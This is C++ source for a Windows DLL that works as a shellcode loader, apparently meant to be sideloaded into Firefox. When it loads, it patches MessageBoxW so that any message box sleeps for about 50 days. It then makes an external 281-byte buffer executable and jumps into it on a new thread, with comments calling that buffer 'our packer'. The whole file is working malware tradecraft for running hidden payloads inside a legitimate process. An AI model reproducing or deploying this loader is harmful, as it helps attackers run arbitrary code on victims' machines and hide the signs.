

#include <cstdint>

#include <Windows.h>

extern "C" unsigned char buf[281];

extern "C" __declspec(dllexport) void AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1()
{
}


void RealMain()
{
	DWORD Dummy = 0;
	VirtualProtect((void*)buf, sizeof(buf), 0x40, &Dummy);

	__asm
	{
		lea eax, buf
		jmp eax
	}
}

void DoSleep()
{
	// Sleep for 50 days
	Sleep(0xfffffffe);
}

BOOL WINAPI DllMain(
	_In_ HINSTANCE hinstDLL,
	_In_ DWORD     fdwReason,
	_In_ LPVOID    lpvReserved
)
{
	// Get the address in memory of MessageBoxW
	// Note: We use LoadLibrary because user32.dll might not have been loaded yet
	// We might have been loaded before Firefox loaded user32.dll
	// Later calls to LoadLibrary will increase a reference counter, not load a library twice
	DWORD pProc = (DWORD)GetProcAddress(LoadLibraryA("user32.dll"), "MessageBoxW");

	// Make sure we can read, write and execute the instructions of MessageBoxW()
	DWORD Dummy = 0;
	VirtualProtect((void*)pProc, 5, 0x40, &Dummy);

	// 0xe9 -> jump xxxxxxx
	*(uint8_t*)pProc = (uint8_t)0xe9;
	// jump DoSleep()
	*(uint32_t*)(pProc + 1) = (uint32_t)((uint32_t)&DoSleep - pProc - 5);

	// Only create a new thread to jump to our packer when the DLL is first loaded
	if (fdwReason == DLL_PROCESS_ATTACH)
		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RealMain, NULL, 0, NULL);

	return TRUE;
}
